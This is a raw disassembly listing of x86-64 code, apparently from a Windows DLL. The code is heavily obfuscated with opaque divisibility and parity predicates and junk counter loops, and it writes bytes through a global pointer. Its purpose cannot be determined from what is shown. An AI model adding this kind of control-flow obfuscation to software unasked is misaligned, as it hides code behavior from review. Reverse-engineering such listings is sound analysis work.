   1800046ec:	f7 e9                	imul   %ecx
   1800046ee:	8b c2                	mov    %edx,%eax
   1800046f0:	c1 e8 1f             	shr    $0x1f,%eax
   1800046f3:	03 d0                	add    %eax,%edx
   1800046f5:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800046f8:	3b c8                	cmp    %eax,%ecx
   1800046fa:	74 46                	je     0x180004742
   1800046fc:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180004702:	41 03 cf             	add    %r15d,%ecx
   180004705:	41 03 c8             	add    %r8d,%ecx
   180004708:	89 8d 88 01 00 00    	mov    %ecx,0x188(%rbp)
   18000470e:	eb 18                	jmp    0x180004728
   180004710:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004716:	03 c3                	add    %ebx,%eax
   180004718:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000471e:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180004722:	03 c3                	add    %ebx,%eax
   180004724:	89 44 24 24          	mov    %eax,0x24(%rsp)
   180004728:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000472e:	23 c6                	and    %esi,%eax
   180004730:	7d 07                	jge    0x180004739
   180004732:	2b c3                	sub    %ebx,%eax
   180004734:	83 c8 fc             	or     $0xfffffffc,%eax
   180004737:	03 c3                	add    %ebx,%eax
   180004739:	85 c0                	test   %eax,%eax
   18000473b:	74 d3                	je     0x180004710
   18000473d:	e9 55 01 00 00       	jmp    0x180004897
   180004742:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004748:	41 23 c2             	and    %r10d,%eax
   18000474b:	7d 07                	jge    0x180004754
   18000474d:	2b c3                	sub    %ebx,%eax
   18000474f:	83 c8 fe             	or     $0xfffffffe,%eax
   180004752:	03 c3                	add    %ebx,%eax
   180004754:	85 c0                	test   %eax,%eax
   180004756:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000475c:	74 46                	je     0x1800047a4
   18000475e:	41 8b cf             	mov    %r15d,%ecx
   180004761:	41 2b c8             	sub    %r8d,%ecx
   180004764:	03 c8                	add    %eax,%ecx
   180004766:	89 8d 88 01 00 00    	mov    %ecx,0x188(%rbp)
   18000476c:	eb 18                	jmp    0x180004786
   18000476e:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180004772:	03 c3                	add    %ebx,%eax
   180004774:	89 44 24 24          	mov    %eax,0x24(%rsp)
   180004778:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000477e:	03 c3                	add    %ebx,%eax
   180004780:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004786:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   18000478c:	41 8b c1             	mov    %r9d,%eax
   18000478f:	f7 e9                	imul   %ecx
   180004791:	8b c2                	mov    %edx,%eax
   180004793:	c1 e8 1f             	shr    $0x1f,%eax
   180004796:	03 d0                	add    %eax,%edx
   180004798:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000479b:	3b c8                	cmp    %eax,%ecx
   18000479d:	74 cf                	je     0x18000476e
   18000479f:	e9 f3 00 00 00       	jmp    0x180004897
   1800047a4:	23 c6                	and    %esi,%eax
   1800047a6:	7d 07                	jge    0x1800047af
   1800047a8:	2b c3                	sub    %ebx,%eax
   1800047aa:	83 c8 fc             	or     $0xfffffffc,%eax
   1800047ad:	03 c3                	add    %ebx,%eax
   1800047af:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800047b5:	85 c0                	test   %eax,%eax
   1800047b7:	74 63                	je     0x18000481c
   1800047b9:	41 03 cf             	add    %r15d,%ecx
   1800047bc:	41 8d 40 03          	lea    0x3(%r8),%eax
   1800047c0:	0f af c8             	imul   %eax,%ecx
   1800047c3:	89 8d 88 01 00 00    	mov    %ecx,0x188(%rbp)
   1800047c9:	eb 39                	jmp    0x180004804
   1800047cb:	8b 44 24 24          	mov    0x24(%rsp),%eax
   1800047cf:	03 c3                	add    %ebx,%eax
   1800047d1:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1800047d5:	b8 67 66 66 66       	mov    $0x66666667,%eax
   1800047da:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800047e0:	f7 e9                	imul   %ecx
   1800047e2:	d1 fa                	sar    $1,%edx
   1800047e4:	8b c2                	mov    %edx,%eax
   1800047e6:	c1 e8 1f             	shr    $0x1f,%eax
   1800047e9:	03 d0                	add    %eax,%edx
   1800047eb:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800047ee:	3b c8                	cmp    %eax,%ecx
   1800047f0:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800047f6:	74 04                	je     0x1800047fc
   1800047f8:	2b c3                	sub    %ebx,%eax
   1800047fa:	eb 02                	jmp    0x1800047fe
   1800047fc:	03 c3                	add    %ebx,%eax
   1800047fe:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004804:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000480a:	41 23 c2             	and    %r10d,%eax
   18000480d:	7d 07                	jge    0x180004816
   18000480f:	2b c3                	sub    %ebx,%eax
   180004811:	83 c8 fe             	or     $0xfffffffe,%eax
   180004814:	03 c3                	add    %ebx,%eax
   180004816:	85 c0                	test   %eax,%eax
   180004818:	74 b1                	je     0x1800047cb
   18000481a:	eb 7b                	jmp    0x180004897
   18000481c:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004821:	f7 e9                	imul   %ecx
   180004823:	d1 fa                	sar    $1,%edx
   180004825:	8b c2                	mov    %edx,%eax
   180004827:	c1 e8 1f             	shr    $0x1f,%eax
   18000482a:	03 d0                	add    %eax,%edx
   18000482c:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000482f:	3b c8                	cmp    %eax,%ecx
   180004831:	74 64                	je     0x180004897
   180004833:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004839:	41 8d 48 17          	lea    0x17(%r8),%ecx
   18000483d:	83 c0 0b             	add    $0xb,%eax
   180004840:	99                   	cltd
   180004841:	f7 f9                	idiv   %ecx
   180004843:	eb 33                	jmp    0x180004878
   180004845:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180004849:	03 c3                	add    %ebx,%eax
   18000484b:	89 44 24 24          	mov    %eax,0x24(%rsp)
   18000484f:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004854:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   18000485a:	f7 e9                	imul   %ecx
   18000485c:	d1 fa                	sar    $1,%edx
   18000485e:	8b c2                	mov    %edx,%eax
   180004860:	c1 e8 1f             	shr    $0x1f,%eax
   180004863:	03 d0                	add    %eax,%edx
   180004865:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180004868:	3b c8                	cmp    %eax,%ecx
   18000486a:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004870:	74 04                	je     0x180004876
   180004872:	03 c3                	add    %ebx,%eax
   180004874:	eb 02                	jmp    0x180004878
   180004876:	2b c3                	sub    %ebx,%eax
   180004878:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000487e:	41 8b c1             	mov    %r9d,%eax
   180004881:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180004887:	f7 e9                	imul   %ecx
   180004889:	8b c2                	mov    %edx,%eax
   18000488b:	c1 e8 1f             	shr    $0x1f,%eax
   18000488e:	03 d0                	add    %eax,%edx
   180004890:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180004893:	3b c8                	cmp    %eax,%ecx
   180004895:	74 ae                	je     0x180004845
   180004897:	8a 8d 80 01 00 00    	mov    0x180(%rbp),%cl
   18000489d:	48 8b 05 74 47 02 00 	mov    0x24774(%rip),%rax        # 0x180029018
   1800048a4:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   1800048a9:	88 08                	mov    %cl,(%rax)
   1800048ab:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800048b0:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800048b6:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800048bc:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800048c2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800048c8:	03 c8                	add    %eax,%ecx
   1800048ca:	41 8b c1             	mov    %r9d,%eax
   1800048cd:	f7 e9                	imul   %ecx
   1800048cf:	8b c2                	mov    %edx,%eax
   1800048d1:	c1 e8 1f             	shr    $0x1f,%eax
   1800048d4:	03 d0                	add    %eax,%edx
   1800048d6:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800048d9:	3b c8                	cmp    %eax,%ecx
   1800048db:	74 4a                	je     0x180004927
   1800048dd:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800048e3:	41 03 cf             	add    %r15d,%ecx
   1800048e6:	41 03 c8             	add    %r8d,%ecx
   1800048e9:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800048ef:	eb 1c                	jmp    0x18000490d
   1800048f1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800048f7:	03 c3                	add    %ebx,%eax
   1800048f9:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800048ff:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004905:	03 c3                	add    %ebx,%eax
   180004907:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000490d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004913:	23 c6                	and    %esi,%eax
   180004915:	7d 07                	jge    0x18000491e
   180004917:	2b c3                	sub    %ebx,%eax
   180004919:	83 c8 fc             	or     $0xfffffffc,%eax
   18000491c:	03 c3                	add    %ebx,%eax
   18000491e:	85 c0                	test   %eax,%eax
   180004920:	74 cf                	je     0x1800048f1
   180004922:	e9 61 01 00 00       	jmp    0x180004a88
   180004927:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000492d:	41 23 c2             	and    %r10d,%eax
   180004930:	7d 07                	jge    0x180004939
   180004932:	2b c3                	sub    %ebx,%eax
   180004934:	83 c8 fe             	or     $0xfffffffe,%eax
   180004937:	03 c3                	add    %ebx,%eax
   180004939:	85 c0                	test   %eax,%eax
   18000493b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004941:	74 4a                	je     0x18000498d
   180004943:	41 8b cf             	mov    %r15d,%ecx
   180004946:	41 2b c8             	sub    %r8d,%ecx
   180004949:	03 c8                	add    %eax,%ecx
   18000494b:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004951:	eb 1c                	jmp    0x18000496f
   180004953:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004959:	03 c3                	add    %ebx,%eax
   18000495b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004961:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004967:	03 c3                	add    %ebx,%eax
   180004969:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000496f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004975:	41 8b c1             	mov    %r9d,%eax
   180004978:	f7 e9                	imul   %ecx
   18000497a:	8b c2                	mov    %edx,%eax
   18000497c:	c1 e8 1f             	shr    $0x1f,%eax
   18000497f:	03 d0                	add    %eax,%edx
   180004981:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180004984:	3b c8                	cmp    %eax,%ecx
   180004986:	74 cb                	je     0x180004953
   180004988:	e9 fb 00 00 00       	jmp    0x180004a88
   18000498d:	23 c6                	and    %esi,%eax
   18000498f:	7d 07                	jge    0x180004998
   180004991:	2b c3                	sub    %ebx,%eax
   180004993:	83 c8 fc             	or     $0xfffffffc,%eax
   180004996:	03 c3                	add    %ebx,%eax
   180004998:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000499e:	85 c0                	test   %eax,%eax
   1800049a0:	74 67                	je     0x180004a09
   1800049a2:	41 03 cf             	add    %r15d,%ecx
   1800049a5:	41 8d 40 03          	lea    0x3(%r8),%eax
   1800049a9:	0f af c8             	imul   %eax,%ecx
   1800049ac:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800049b2:	eb 3d                	jmp    0x1800049f1
   1800049b4:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800049ba:	03 c3                	add    %ebx,%eax
   1800049bc:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800049c2:	b8 67 66 66 66       	mov    $0x66666667,%eax
   1800049c7:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800049cd:	f7 e9                	imul   %ecx
   1800049cf:	d1 fa                	sar    $1,%edx
   1800049d1:	8b c2                	mov    %edx,%eax
   1800049d3:	c1 e8 1f             	shr    $0x1f,%eax
   1800049d6:	03 d0                	add    %eax,%edx
   1800049d8:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800049db:	3b c8                	cmp    %eax,%ecx
   1800049dd:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800049e3:	74 04                	je     0x1800049e9
   1800049e5:	2b c3                	sub    %ebx,%eax
   1800049e7:	eb 02                	jmp    0x1800049eb
   1800049e9:	03 c3                	add    %ebx,%eax
   1800049eb:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800049f1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800049f7:	41 23 c2             	and    %r10d,%eax
   1800049fa:	7d 07                	jge    0x180004a03
   1800049fc:	2b c3                	sub    %ebx,%eax
   1800049fe:	83 c8 fe             	or     $0xfffffffe,%eax
   180004a01:	03 c3                	add    %ebx,%eax
   180004a03:	85 c0                	test   %eax,%eax
   180004a05:	74 ad                	je     0x1800049b4
   180004a07:	eb 7f                	jmp    0x180004a88
   180004a09:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004a0e:	f7 e9                	imul   %ecx
   180004a10:	d1 fa                	sar    $1,%edx
   180004a12:	8b c2                	mov    %edx,%eax
   180004a14:	c1 e8 1f             	shr    $0x1f,%eax
   180004a17:	03 d0                	add    %eax,%edx
   180004a19:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180004a1c:	3b c8                	cmp    %eax,%ecx
   180004a1e:	74 68                	je     0x180004a88
   180004a20:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004a26:	41 8d 48 17          	lea    0x17(%r8),%ecx
   180004a2a:	83 c0 0b             	add    $0xb,%eax
   180004a2d:	99                   	cltd
   180004a2e:	f7 f9                	idiv   %ecx
   180004a30:	eb 37                	jmp    0x180004a69
   180004a32:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004a38:	03 c3                	add    %ebx,%eax
   180004a3a:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004a40:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004a45:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004a4b:	f7 e9                	imul   %ecx
   180004a4d:	d1 fa                	sar    $1,%edx
   180004a4f:	8b c2                	mov    %edx,%eax
   180004a51:	c1 e8 1f             	shr    $0x1f,%eax
   180004a54:	03 d0                	add    %eax,%edx
   180004a56:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180004a59:	3b c8                	cmp    %eax,%ecx
   180004a5b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004a61:	74 04                	je     0x180004a67
   180004a63:	03 c3                	add    %ebx,%eax
   180004a65:	eb 02                	jmp    0x180004a69
   180004a67:	2b c3                	sub    %ebx,%eax
   180004a69:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004a6f:	41 8b c1             	mov    %r9d,%eax
   180004a72:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004a78:	f7 e9                	imul   %ecx
   180004a7a:	8b c2                	mov    %edx,%eax
   180004a7c:	c1 e8 1f             	shr    $0x1f,%eax
   180004a7f:	03 d0                	add    %eax,%edx
   180004a81:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180004a84:	3b c8                	cmp    %eax,%ecx
   180004a86:	74 aa                	je     0x180004a32
   180004a88:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   180004a8d:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180004a92:	48 29 1d 7f 45 02 00 	sub    %rbx,0x2457f(%rip)        # 0x180029018
   180004a99:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004a9f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004aa5:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180004aab:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004ab1:	03 c8                	add    %eax,%ecx
   180004ab3:	41 8b c1             	mov    %r9d,%eax
   180004ab6:	f7 e9                	imul   %ecx
   180004ab8:	8b c2                	mov    %edx,%eax
   180004aba:	c1 e8 1f             	shr    $0x1f,%eax
   180004abd:	03 d0                	add    %eax,%edx
   180004abf:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180004ac2:	3b c8                	cmp    %eax,%ecx
   180004ac4:	74 4a                	je     0x180004b10
   180004ac6:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004acc:	41 03 cf             	add    %r15d,%ecx
   180004acf:	41 03 c8             	add    %r8d,%ecx
   180004ad2:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004ad8:	eb 1c                	jmp    0x180004af6
   180004ada:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004ae0:	03 c3                	add    %ebx,%eax
   180004ae2:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004ae8:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004aee:	03 c3                	add    %ebx,%eax
   180004af0:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004af6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004afc:	23 c6                	and    %esi,%eax
   180004afe:	7d 07                	jge    0x180004b07
   180004b00:	2b c3                	sub    %ebx,%eax
   180004b02:	83 c8 fc             	or     $0xfffffffc,%eax
   180004b05:	03 c3                	add    %ebx,%eax
   180004b07:	85 c0                	test   %eax,%eax
   180004b09:	74 cf                	je     0x180004ada
   180004b0b:	e9 61 01 00 00       	jmp    0x180004c71
   180004b10:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004b16:	41 23 c2             	and    %r10d,%eax
   180004b19:	7d 07                	jge    0x180004b22
   180004b1b:	2b c3                	sub    %ebx,%eax
   180004b1d:	83 c8 fe             	or     $0xfffffffe,%eax
   180004b20:	03 c3                	add    %ebx,%eax
   180004b22:	85 c0                	test   %eax,%eax
   180004b24:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004b2a:	74 4a                	je     0x180004b76
   180004b2c:	41 8b cf             	mov    %r15d,%ecx
   180004b2f:	41 2b c8             	sub    %r8d,%ecx
   180004b32:	03 c8                	add    %eax,%ecx
   180004b34:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004b3a:	eb 1c                	jmp    0x180004b58
   180004b3c:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004b42:	03 c3                	add    %ebx,%eax
   180004b44:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004b4a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004b50:	03 c3                	add    %ebx,%eax
   180004b52:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004b58:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004b5e:	41 8b c1             	mov    %r9d,%eax
   180004b61:	f7 e9                	imul   %ecx
   180004b63:	8b c2                	mov    %edx,%eax
   180004b65:	c1 e8 1f             	shr    $0x1f,%eax
   180004b68:	03 d0                	add    %eax,%edx
   180004b6a:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180004b6d:	3b c8                	cmp    %eax,%ecx
   180004b6f:	74 cb                	je     0x180004b3c
   180004b71:	e9 fb 00 00 00       	jmp    0x180004c71
   180004b76:	23 c6                	and    %esi,%eax
   180004b78:	7d 07                	jge    0x180004b81
   180004b7a:	2b c3                	sub    %ebx,%eax
   180004b7c:	83 c8 fc             	or     $0xfffffffc,%eax
   180004b7f:	03 c3                	add    %ebx,%eax
   180004b81:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004b87:	85 c0                	test   %eax,%eax
   180004b89:	74 67                	je     0x180004bf2
   180004b8b:	41 03 cf             	add    %r15d,%ecx
   180004b8e:	41 8d 40 03          	lea    0x3(%r8),%eax
   180004b92:	0f af c8             	imul   %eax,%ecx
   180004b95:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004b9b:	eb 3d                	jmp    0x180004bda
   180004b9d:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004ba3:	03 c3                	add    %ebx,%eax
   180004ba5:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004bab:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004bb0:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004bb6:	f7 e9                	imul   %ecx
   180004bb8:	d1 fa                	sar    $1,%edx
   180004bba:	8b c2                	mov    %edx,%eax
   180004bbc:	c1 e8 1f             	shr    $0x1f,%eax
   180004bbf:	03 d0                	add    %eax,%edx
   180004bc1:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180004bc4:	3b c8                	cmp    %eax,%ecx
   180004bc6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004bcc:	74 04                	je     0x180004bd2
   180004bce:	2b c3                	sub    %ebx,%eax
   180004bd0:	eb 02                	jmp    0x180004bd4
   180004bd2:	03 c3                	add    %ebx,%eax
